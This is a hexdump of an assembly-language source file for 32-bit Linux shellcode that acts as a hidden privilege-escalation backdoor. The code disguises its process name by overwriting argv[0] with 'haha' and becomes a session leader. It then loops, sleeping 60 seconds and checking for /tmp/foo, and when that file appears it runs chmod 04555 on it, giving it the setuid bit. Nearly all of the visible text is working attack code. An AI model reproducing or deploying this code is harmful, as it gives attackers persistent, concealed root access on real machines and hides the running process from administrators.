00001870  20 20 20 20 6c 6f 6f 70  20 66 69 6e 64 61 72 67  |    loop findarg|
00001880  73 0d 0a 09 20 20 20 20  20 20 69 6e 63 20 25 65  |s...      inc %e|
00001890  64 69 0d 0a 09 20 20 20  20 20 20 69 6e 63 20 25  |di...      inc %|
000018a0  65 64 69 0d 0a 09 20 20  20 20 20 20 0d 0a 0d 0a  |edi...      ....|
000018b0  09 20 20 20 20 20 20 23  2d 2d 2d 2d 2d 2d 2d 2d  |.      #--------|
000018c0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000018e0  2d 2d 23 0d 0a 09 20 20  20 20 20 20 23 20 74 72  |--#...      # tr|
000018f0  61 6e 73 6c 61 74 65 20  73 74 72 69 6e 67 20 69  |anslate string i|
00001900  6e 74 6f 20 61 20 72 65  61 6c 20 6e 75 6d 62 65  |nto a real numbe|
00001910  72 20 74 6f 20 20 20 23  0d 0a 09 20 20 20 20 20  |r to   #...     |
00001920  20 23 20 6f 62 74 61 69  6e 20 70 6f 69 6e 74 65  | # obtain pointe|
00001930  72 2e 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |r.              |
00001940  20 20 20 20 20 20 20 20  20 20 20 20 23 0d 0a 09  |            #...|
00001950  20 20 20 20 20 20 23 2d  2d 2d 2d 2d 2d 2d 2d 2d  |      #---------|
00001960  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00001980  2d 23 0d 0a 0d 0a 20 20  20 20 20 20 20 20 20 20  |-#....          |
00001990  20 20 20 20 78 6f 72 20  25 65 61 78 2c 20 25 65  |    xor %eax, %e|
000019a0  61 78 0d 0a 09 20 20 20  20 20 20 70 75 73 68 20  |ax...      push |
000019b0  24 31 30 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |$10..           |
000019c0  20 20 20 70 6f 70 20 25  65 62 78 0d 0a 20 20 20  |   pop %ebx..   |
000019d0  20 20 20 20 20 20 20 20  20 20 20 63 6c 64 20 0d  |           cld .|
000019e0  0a 0d 0a 20 63 61 6c 63  6c 6f 6f 70 3a 20 0d 0a  |... calcloop: ..|
000019f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 78 6f  |              xo|
00001a00  72 20 25 65 64 78 2c 20  25 65 64 78 0d 0a 20 20  |r %edx, %edx..  |
00001a10  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 62  |            movb|
00001a20  20 28 25 65 64 69 29 2c  20 25 63 6c 0d 0a 20 20  | (%edi), %cl..  |
00001a30  20 20 20 20 20 20 20 20  20 20 20 20 73 75 62 6c  |            subl|
00001a40  20 24 30 78 33 30 2c 20  25 65 63 78 0d 0a 20 20  | $0x30, %ecx..  |
00001a50  20 20 20 20 20 20 20 20  20 20 20 20 61 64 64 6c  |            addl|
00001a60  20 25 65 63 78 2c 20 25  65 61 78 0d 0a 20 20 20  | %ecx, %eax..   |
00001a70  20 20 20 20 20 20 20 20  20 20 20 69 6e 63 20 25  |           inc %|
00001a80  65 64 69 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |edi..           |
00001a90  20 20 20 63 6d 70 62 20  24 30 78 32 30 2c 20 28  |   cmpb $0x20, (|
00001aa0  25 65 64 69 29 20 0d 0a  20 20 20 20 20 20 20 20  |%edi) ..        |
00001ab0  20 20 20 20 20 20 6a 65  20 64 6f 6e 65 5f 67 6f  |      je done_go|
00001ac0  74 6e 75 6d 0d 0a 20 20  20 20 20 20 20 20 20 20  |tnum..          |
00001ad0  20 20 20 20 6d 75 6c 20  25 65 62 78 0d 0a 20 20  |    mul %ebx..  |
00001ae0  20 20 20 20 20 20 20 20  20 20 20 20 6a 6d 70 20  |            jmp |
00001af0  63 61 6c 63 6c 6f 6f 70  20 0d 0a 0d 0a 0d 0a 20  |calcloop ...... |
00001b00  20 20 20 20 20 20 20 20  20 20 20 20 20 23 2d 2d  |             #--|
00001b10  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00001b30  2d 2d 2d 2d 2d 2d 2d 2d  23 0d 0a 20 20 20 20 20  |--------#..     |
00001b40  20 20 20 20 20 20 20 20  20 23 20 6f 6e 63 65 20  |         # once |
00001b50  77 65 20 68 61 76 65 20  74 68 65 20 6c 6f 63 61  |we have the loca|
00001b60  74 69 6f 6e 20 69 6e 20  6d 65 6d 6f 72 79 20 6f  |tion in memory o|
00001b70  66 20 20 20 23 0d 0a 20  20 20 20 20 20 20 20 20  |f   #..         |
00001b80  20 20 20 20 20 23 20 70  6f 69 6e 74 65 72 73 20  |     # pointers |
00001b90  74 6f 20 61 72 67 63 2c  61 72 67 76 5b 30 2d 3f  |to argc,argv[0-?|
00001ba0  5d 2c 20 61 6e 64 20 65  6e 76 70 2c 20 20 20 20  |], and envp,    |
00001bb0  23 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |#..             |
00001bc0  20 23 20 65 78 74 72 61  63 74 20 74 68 65 20 6c  | # extract the l|
00001bd0  6f 63 61 74 69 6f 6e 20  6f 66 20 61 72 67 76 5b  |ocation of argv[|
00001be0  30 5d 20 20 20 20 20 20  20 20 20 20 23 0d 0a 20  |0]          #.. |
00001bf0  20 20 20 20 20 20 20 20  20 20 20 20 20 23 2d 2d  |             #--|
00001c00  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00001c20  2d 2d 2d 2d 2d 2d 2d 2d  23 0d 0a 0d 0a 20 64 6f  |--------#.... do|
00001c30  6e 65 5f 67 6f 74 6e 75  6d 3a 0d 0a 20 20 20 20  |ne_gotnum:..    |
00001c40  20 20 20 20 20 20 20 20  20 20 78 63 68 67 20 25  |          xchg %|
00001c50  65 61 78 2c 20 25 65 73  70 0d 0a 09 20 20 20 20  |eax, %esp...    |
00001c60  20 20 70 6f 70 20 25 65  64 69 20 20 20 20 20 20  |  pop %edi      |
00001c70  20 20 20 20 0d 0a 09 20  20 20 20 20 20 70 6f 70  |    ...      pop|
00001c80  20 25 65 64 69 0d 0a 09  20 20 20 20 20 20 78 63  | %edi...      xc|
00001c90  68 67 20 25 65 61 78 2c  20 25 65 73 70 0d 0a 0d  |hg %eax, %esp...|
00001ca0  0a 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |...             |
00001cb0  20 23 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  | #--------------|
00001cc0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00001cd0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 23 0d 0a 20  |------------#.. |
00001ce0  20 20 20 20 20 20 20 20  20 20 20 20 20 23 20 77  |             # w|
00001cf0  72 69 74 65 20 32 35 35  20 6e 75 6c 6c 20 63 68  |rite 255 null ch|
00001d00  61 72 61 63 74 65 72 73  20 70 61 73 74 20 61 72  |aracters past ar|
00001d10  67 76 5b 30 5d 20 20 20  23 0d 0a 20 20 20 20 20  |gv[0]   #..     |
00001d20  20 20 20 20 20 20 20 20  20 23 20 74 6f 20 6f 76  |         # to ov|
00001d30  65 72 77 72 69 74 65 20  69 74 20 61 6e 64 20 61  |erwrite it and a|
00001d40  6e 79 20 6f 74 68 65 72  20 61 72 67 73 20 73 6f  |ny other args so|
00001d50  20 70 73 20 23 0d 0a 20  20 20 20 20 20 20 20 20  | ps #..         |
00001d60  20 20 20 20 20 23 20 77  6f 6e 74 20 73 65 65 20  |     # wont see |
00001d70  74 68 65 6d 20 6c 61 74  65 72 20 20 20 20 20 20  |them later      |
00001d80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001d90  23 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |#..             |
00001da0  20 23 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  | #--------------|
00001db0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00001dc0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 23 0d 0a 0d  |------------#...|
00001dd0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |.              p|
00001de0  75 73 68 20 25 65 64 69  0d 0a 20 20 20 20 20 20  |ush %edi..      |
00001df0  20 20 20 20 20 20 20 20  6d 6f 76 62 20 24 30 78  |        movb $0x|
00001e00  66 66 2c 20 25 63 6c 0d  0a 20 20 20 20 20 20 20  |ff, %cl..       |
00001e10  20 20 20 20 20 20 20 78  6f 72 20 25 65 61 78 2c  |       xor %eax,|
00001e20  20 25 65 61 78 0d 0a 20  20 20 20 20 20 20 20 20  | %eax..         |
00001e30  20 20 20 20 20 72 65 70  20 73 74 6f 73 62 0d 0a  |     rep stosb..|
00001e40  20 20 20 20 20 20 20 20  20 20 20 20 20 20 70 6f  |              po|
00001e50  70 20 25 65 64 69 0d 0a  0d 0a 0d 0a 0d 0a 09 23  |p %edi.........#|
00001e60  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |################|
*
00001eb0  23 23 0d 0a 20 20 20 20  20 20 20 20 23 23 20 20  |##..        ##  |
00001ec0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00001f00  20 20 20 20 20 20 20 20  20 20 20 20 20 23 23 0d  |             ##.|
00001f10  0a 20 20 20 20 20 20 20  20 23 23 20 20 20 20 20  |.        ##     |
00001f20  20 31 29 20 47 65 74 20  6c 6f 63 61 74 69 6f 6e  | 1) Get location|
00001f30  20 6f 66 20 73 74 72 69  6e 67 20 77 65 20 61 72  | of string we ar|
00001f40  65 20 67 6f 69 6e 67 20  74 6f 20 63 6f 70 79 20  |e going to copy |
00001f50  6f 76 65 72 20 61 72 67  76 5b 30 5d 20 61 6e 64  |over argv[0] and|
00001f60  20 66 69 78 20 20 20 20  20 20 23 23 20 0d 0a 20  | fix      ## .. |
00001f70  20 20 20 20 20 20 20 23  23 20 20 20 20 20 20 20  |       ##       |
00001f80  20 20 6e 75 6c 6c 40 65  6e 64 2e 20 20 20 20 20  |  null@end.     |
00001f90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00001fc0  20 20 20 20 20 20 20 20  23 23 0d 0a 20 20 20 20  |        ##..    |
00001fd0  20 20 20 20 23 23 20 20  20 20 20 20 32 29 20 43  |    ##      2) C|
00001fe0  61 6c 6c 20 73 65 74 73  69 64 28 29 20 74 6f 20  |all setsid() to |
00001ff0  65 78 74 61 62 6c 69 73  68 20 75 73 20 61 73 20  |extablish us as |
00002000  61 20 70 72 6f 63 65 73  73 20 6c 65 61 64 65 72  |a process leader|
00002010  2e 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00002020  20 20 20 20 20 23 23 0d  0a 20 20 20 20 20 20 20  |     ##..       |
00002030  20 23 23 20 20 20 20 20  20 33 29 20 4a 75 6d 70  | ##      3) Jump|
00002040  20 6f 76 65 72 20 73 74  72 69 6e 67 73 20 69 6e  | over strings in|
00002050  74 6f 20 73 68 65 6c 6c  63 6f 64 65 2e 20 20 20  |to shellcode.   |
00002060  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00002080  20 20 23 23 0d 0a 20 20  20 20 20 20 20 20 23 23  |  ##..        ##|
00002090  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000020d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 23  |               #|
000020e0  23 0d 0a 09 23 23 23 23  23 23 23 23 23 23 23 23  |#...############|
000020f0  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |################|
*
00002130  23 23 23 23 23 23 23 0d  0a 0d 0a 0d 0a 20 20 20  |#######......   |
00002140  20 20 20 20 20 20 20 20  20 20 20 23 2d 2d 2d 2d  |           #----|
00002150  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00002170  2d 2d 2d 2d 2d 2d 23 0d  0a 20 20 20 20 20 20 20  |------#..       |
00002180  20 20 20 20 20 20 20 23  20 47 65 74 20 73 74 72  |       # Get str|
00002190  69 6e 67 20 6c 6f 63 61  74 69 6f 6e 2c 20 66 69  |ing location, fi|
000021a0  78 20 6e 75 6c 6c 63 68  61 72 20 61 6e 64 20 20  |x nullchar and  |
000021b0  20 20 23 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |  #..           |
000021c0  20 20 20 23 20 63 6f 70  79 20 6f 76 65 72 20 61  |   # copy over a|
000021d0  72 67 76 5b 30 5d 2c 20  20 20 20 20 20 20 20 20  |rgv[0],         |
000021e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 23 0d  |              #.|
000021f0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 23  |.              #|
00002200  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00002220  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 23 0d 0a 0d 0a 0d  |----------#.....|
00002230  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |.              p|
00002240  75 73 68 20 25 65 73 69  0d 0a 20 20 20 20 20 20  |ush %esi..      |
00002250  20 20 20 20 20 20 20 20  64 65 63 20 25 65 73 69  |        dec %esi|
00002260  0d 0a 20 66 69 6e 64 65  6e 64 3a 0d 0a 20 20 20  |.. findend:..   |
00002270  20 20 20 20 20 20 20 20  20 20 20 69 6e 63 20 25  |           inc %|
00002280  65 73 69 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |esi..           |
00002290  20 20 20 69 6e 63 20 25  65 63 78 0d 0a 20 20 20  |   inc %ecx..   |
000022a0  20 20 20 20 20 20 20 20  20 20 20 63 6d 70 62 20  |           cmpb |
000022b0  24 30 78 66 66 2c 20 28  25 65 73 69 29 0d 0a 20  |$0xff, (%esi).. |
000022c0  20 20 20 20 20 20 20 20  20 20 20 20 20 6a 6e 65  |             jne|
000022d0  20 66 69 6e 64 65 6e 64  0d 0a 0d 0a 20 20 20 20  | findend....    |
000022e0  20 20 20 20 20 20 20 20  20 20 69 6e 63 62 20 28  |          incb (|
000022f0  25 65 73 69 29 0d 0a 20  20 20 20 20 20 20 20 20  |%esi)..         |
00002300  20 20 20 20 20 70 6f 70  20 25 65 73 69 20 20 20  |     pop %esi   |
00002310  20 20 20 20 20 20 20 20  20 20 20 20 0d 0a 09 20  |            ... |
00002320  20 20 20 20 20 72 65 70  20 6d 6f 76 73 62 0d 0a  |     rep movsb..|
00002330  0d 0a 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |....            |
00002340  20 20 23 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |  #-------------|
00002350  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00002360  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 23 0d 0a  |-------------#..|
00002370  20 20 20 20 20 20 20 20  20 20 20 20 20 20 23 20  |              # |
00002380  43 61 6c 6c 20 73 65 74  73 69 64 28 29 20 74 6f  |Call setsid() to|
00002390  20 65 73 74 61 62 6c 69  73 68 20 75 73 20 61 73  | establish us as|
000023a0  20 61 20 20 20 20 20 20  20 23 0d 0a 20 20 20 20  | a       #..    |
000023b0  20 20 20 20 20 20 20 20  20 20 23 20 70 72 6f 63  |          # proc|
000023c0  65 73 73 20 6c 65 61 64  65 72 2e 20 20 20 20 20  |ess leader.     |
000023d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000023e0  20 20 20 20 20 23 0d 0a  20 20 20 20 20 20 20 20  |     #..        |
000023f0  20 20 20 20 20 20 23 2d  2d 2d 2d 2d 2d 2d 2d 2d  |      #---------|
00002400  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00002420  2d 23 0d 0a 0d 0a 20 20  20 20 20 20 20 20 20 20  |-#....          |
00002430  20 20 20 20 6d 6f 76 62  20 24 36 36 2c 20 25 61  |    movb $66, %a|
00002440  6c 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |l..             |
00002450  20 69 6e 74 20 24 30 78  38 30 0d 0a 0d 0a 20 20  | int $0x80....  |
00002460  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 20  |            mov |
00002470  25 65 73 69 2c 20 25 65  64 69 0d 0a 20 20 20 20  |%esi, %edi..    |
00002480  20 20 20 20 20 20 20 20  20 20 78 63 68 67 20 25  |          xchg %|
00002490  65 61 78 2c 20 25 65 64  78 0d 0a 0d 0a 20 20 20  |eax, %edx....   |
000024a0  20 20 20 20 20 20 20 20  20 20 20 64 65 63 20 25  |           dec %|
000024b0  65 61 78 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |eax..           |
000024c0  20 20 20 6d 6f 76 20 25  65 61 78 2c 20 25 65 63  |   mov %eax, %ec|
000024d0  78 20 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |x ..            |
000024e0  20 20 72 65 70 6e 65 20  73 63 61 73 62 0d 0a 20  |  repne scasb.. |
000024f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 0d 0a  |              ..|
00002500  20 20 20 20 20 20 20 20  20 20 20 20 20 20 69 6e  |              in|
00002510  63 62 20 2d 31 28 25 65  64 69 29 0d 0a 0d 0a 0d  |cb -1(%edi).....|
00002520  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 23  |.              #|
00002530  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00002550  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 23 0d 0a 20 20 20  |----------#..   |
00002560  20 20 20 20 20 20 20 20  20 20 20 23 20 4a 75 6d  |           # Jum|
00002570  70 20 6f 76 65 72 20 73  74 72 69 6e 67 73 20 69  |p over strings i|
00002580  6e 74 6f 20 73 68 65 6c  6c 63 6f 64 65 20 20 20  |nto shellcode   |
00002590  20 20 20 20 20 20 23 0d  0a 20 20 20 20 20 20 20  |      #..       |
000025a0  20 20 20 20 20 20 20 23  2d 2d 2d 2d 2d 2d 2d 2d  |       #--------|
000025b0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000025d0  2d 2d 23 0d 0a 0d 0a 20  20 20 20 20 20 20 20 20  |--#....         |
000025e0  20 20 20 20 20 6a 6d 70  20 2a 25 65 64 69 0d 0a  |     jmp *%edi..|
000025f0  0d 0a 0d 0a 09 23 23 23  23 23 23 23 23 23 23 23  |.....###########|
00002600  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |################|
*
00002640  23 23 23 23 23 23 23 23  0d 0a 20 20 20 20 20 20  |########..      |
00002650  20 20 23 23 20 20 20 20  20 53 54 52 49 4e 47 53  |  ##     STRINGS|
00002660  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000026a0  20 20 20 23 23 0d 0a 09  23 23 23 23 23 23 23 23  |   ##...########|
000026b0  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |################|
*
000026f0  23 23 23 23 23 23 23 23  23 23 23 0d 0a 0d 0a 0d  |###########.....|
00002700  0a 09 70 72 6f 63 5f 6e  61 6d 65 3a 0d 0a 09 09  |..proc_name:....|
00002710  63 61 6c 6c 20 72 65 74  5f 77 5f 70 72 6f 63 0d  |call ret_w_proc.|
00002720  0a 09 09 2e 61 73 63 69  69 20 22 2f 70 72 6f 63  |....ascii "/proc|
00002730  2f 73 65 6c 66 2f 73 74  61 74 5c 78 66 66 22 0d  |/self/stat\xff".|
00002740  0a 09 0d 0a 20 20 20 72  65 70 6c 61 63 65 5f 73  |....   replace_s|
00002750  74 72 69 6e 67 3a 0d 0a  09 09 2e 61 73 63 69 69  |tring:.....ascii|
00002760  20 22 68 61 68 61 5c 78  66 66 22 0d 0a 0d 0a 20  | "haha\xff".... |
00002770  20 20 20 20 20 20 20 20  66 69 6c 65 6e 61 6d 65  |        filename|
00002780  3a 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |:..             |
00002790  20 20 20 2e 61 73 63 69  69 20 22 2f 74 6d 70 2f  |   .ascii "/tmp/|
000027a0  66 6f 6f 5c 78 66 66 22  0d 0a 0d 0a 0d 0a 09 23  |foo\xff".......#|
000027b0  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |################|
*
00002800  23 23 0d 0a 20 20 20 20  20 20 20 20 23 20 20 20  |##..        #   |
00002810  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00002850  20 20 20 20 20 20 20 20  20 20 20 20 20 20 23 0d  |              #.|
00002860  0a 20 20 20 20 20 20 20  20 23 20 53 48 45 4c 4c  |.        # SHELL|
00002870  43 4f 44 45 20 20 20 20  20 20 20 20 20 20 20 20  |CODE            |
00002880  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000028b0  20 20 20 20 20 20 20 20  20 20 20 23 0d 0a 20 20  |           #..  |
000028c0  20 20 20 20 20 20 23 20  20 20 20 20 20 20 20 20  |      #         |
000028d0  20 31 29 20 63 61 6c 6c  20 6e 61 6e 6f 73 6c 65  | 1) call nanosle|
000028e0  65 70 28 36 30 29 20 20  20 20 20 20 20 20 20 20  |ep(60)          |
000028f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00002910  20 20 20 20 20 20 20 20  23 0d 0a 20 20 20 20 20  |        #..     |
00002920  20 20 20 23 20 20 20 20  20 20 20 20 20 20 32 29  |   #          2)|
00002930  20 63 68 65 63 6b 20 74  6f 20 73 65 65 20 69 66  | check to see if|
00002940  20 46 49 4c 45 4e 41 4d  45 20 65 78 69 73 74 20  | FILENAME exist |
00002950  77 2f 20 61 63 63 65 73  73 28 29 20 20 20 20 20  |w/ access()     |
00002960  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002970  20 20 20 20 20 23 0d 0a  20 20 20 20 20 20 20 20  |     #..        |
00002980  23 20 20 20 20 20 20 20  20 20 20 33 29 20 69 66  |#          3) if|
00002990  20 69 74 20 64 6f 65 73  2c 20 74 68 65 6e 20 63  | it does, then c|
000029a0  68 6d 6f 64 20 30 34 35  35 35 20 46 49 4c 45 4e  |hmod 04555 FILEN|
000029b0  41 4d 45 20 61 6e 64 20  65 78 69 74 20 20 20 20  |AME and exit    |
000029c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000029d0  20 20 23 0d 0a 20 20 20  20 20 20 20 20 23 20 20  |  #..        #  |
000029e0  20 20 20 20 20 20 20 20  34 29 20 5f 65 78 69 74  |        4) _exit|
000029f0  28 29 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |()              |
00002a00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00002a20  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 23  |               #|
00002a30  0d 0a 20 20 20 20 20 20  20 20 23 20 20 20 20 20  |..        #     |
00002a40  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00002a80  20 20 20 20 20 20 20 20  20 20 20 20 23 0d 0a 09  |            #...|
00002a90  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |################|
*
00002ae0  23 23 23 0d 0a 0d 0a 20  20 20 20 20 20 20 73 68  |###....       sh|
00002af0  65 6c 6c 63 6f 64 65 3a  0d 0a 20 20 20 20 20 20  |ellcode:..      |
00002b00  20 20 20 20 20 20 20 20  20 20 70 75 73 68 20 24  |          push $|
00002b10  36 30 0d 0a 0d 0a 20 20  20 20 63 68 65 63 6b 66  |60....    checkf|
00002b20  6f 72 66 69 6c 65 3a 0d  0a 20 20 20 20 20 20 20  |orfile:..       |
00002b30  20 20 20 20 20 20 20 20  20 69 6e 63 20 25 65 61  |         inc %ea|
00002b40  78 0d 0a 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |x....           |
00002b50  20 20 20 23 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |   #------------|
00002b60  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00002b70  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 23 0d  |--------------#.|
00002b80  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 23  |.              #|
00002b90  20 6e 61 6e 6f 73 6c 65  65 70 28 25 65 64 69 29  | nanosleep(%edi)|
00002ba0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002bb0  20 20 20 20 20 20 20 20  20 20 23 0d 0a 20 20 20  |          #..   |
00002bc0  20 20 20 20 20 20 20 20  20 20 20 23 2d 2d 2d 2d  |           #----|
00002bd0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00002bf0  2d 2d 2d 2d 2d 2d 23 0d  0a 20 20 20 20 20 20 20  |------#..       |
00002c00  20 20 20 20 20 20 20 20  20 6d 6f 76 20 25 65 73  |         mov %es|
00002c10  70 2c 20 25 65 63 78 0d  0a 20 20 20 20 20 20 20  |p, %ecx..       |
00002c20  20 20 20 20 20 20 20 20  20 6d 6f 76 20 25 65 73  |         mov %es|
00002c30  70 2c 20 25 65 63 78 0d  0a 20 20 20 20 20 20 20  |p, %ecx..       |
00002c40  20 20 20 20 20 20 20 20  20 6d 6f 76 20 25 65 73  |         mov %es|
00002c50  70 2c 20 25 65 62 78 0d  0a 20 20 20 20 20 20 20  |p, %ebx..       |
00002c60  20 20 20 20 20 20 20 20  20 78 6f 72 62 20 24 30  |         xorb $0|
00002c70  78 61 32 2c 20 25 61 6c  0d 0a 20 20 20 20 20 20  |xa2, %al..      |
00002c80  20 20 20 20 20 20 20 20  20 20 69 6e 74 20 24 30  |          int $0|
00002c90  78 38 30 0d 0a 0d 0a 0d  0a 20 20 20 20 20 20 20  |x80......       |
00002ca0  20 20 20 20 20 20 20 23  2d 2d 2d 2d 2d 2d 2d 2d  |       #--------|
00002cb0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00002cd0  2d 2d 23 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |--#..           |
00002ce0  20 20 20 23 20 61 63 63  65 73 73 28 28 25 65 73  |   # access((%es|
00002cf0  69 29 2c 30 29 20 20 20  20 20 20 20 20 20 20 20  |i),0)           |
00002d00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 23 0d  |              #.|
00002d10  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 23  |.              #|
00002d20  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00002d40  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 23 0d 0a 0d 0a 20  |----------#.... |
00002d50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 78  |               x|
00002d60  6f 72 20 25 65 63 78 2c  20 25 65 63 78 0d 0a 20  |or %ecx, %ecx.. |
00002d70  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
00002d80  6f 76 20 25 65 73 69 2c  20 25 65 62 78 0d 0a 20  |ov %esi, %ebx.. |
00002d90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 78  |               x|
00002da0  6f 72 62 20 24 30 78 32  31 2c 20 25 61 6c 0d 0a  |orb $0x21, %al..|
00002db0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002dc0  69 6e 74 20 24 30 78 38  30 0d 0a 0d 0a 20 20 20  |int $0x80....   |
00002dd0  20 20 20 20 20 20 20 20  20 20 20 20 20 74 65 73  |             tes|
00002de0  74 20 25 65 61 78 2c 20  25 65 61 78 0d 0a 20 20  |t %eax, %eax..  |
00002df0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6a 6e  |              jn|
00002e00  65 20 63 68 65 63 6b 66  6f 72 66 69 6c 65 20 0d  |e checkforfile .|
00002e10  0a 0d 0a 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |.....           |
00002e20  20 20 20 23 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |   #------------|
00002e30  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00002e40  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 23 0d  |--------------#.|
00002e50  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 23  |.              #|
00002e60  20 63 68 6d 6f 64 28 28  25 65 73 69 29 2c 30 34  | chmod((%esi),04|
00002e70  35 35 35 29 20 20 20 20  20 20 20 20 20 20 20 20  |555)            |
00002e80  20 20 20 20 20 20 20 20  20 20 23 0d 0a 20 20 20  |          #..   |
00002e90  20 20 20 20 20 20 20 20  20 20 20 23 2d 2d 2d 2d  |           #----|
00002ea0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00002ec0  2d 2d 2d 2d 2d 2d 23 0d  0a 0d 0a 20 20 20 20 20  |------#....     |
00002ed0  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 62 20  |           movb |
00002ee0  24 30 78 66 2c 20 25 61  6c 0d 0a 20 20 20 20 20  |$0xf, %al..     |
00002ef0  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 77 20  |           movw |
00002f00  24 30 78 39 36 64 2c 20  25 63 78 20 0d 0a 20 20  |$0x96d, %cx ..  |
